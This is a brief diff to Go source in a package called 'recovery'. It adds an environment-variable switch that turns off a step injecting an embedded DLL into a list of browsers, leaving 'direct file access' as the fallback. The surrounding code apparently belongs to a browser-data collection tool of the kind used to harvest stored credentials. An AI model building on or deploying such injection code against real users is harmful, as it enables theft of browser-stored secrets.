@@ -3,11 +3,18 @@
 package recovery
 
 import (
+	"os"
+
 	"recovery/recovery/browser"
 	"recovery/recovery/platform"
 )
 
 func platformSetupCollect() {
+	if os.Getenv("KEMATIAN_NO_INJECT") != "" {
+		logf("injection disabled via KEMATIAN_NO_INJECT — direct file access only")
+		return
+	}
+
 	dllBytes := platform.GetEmbeddedDLL()
 	if dllBytes != nil {
 		for _, cfg := range browser.Browsers {
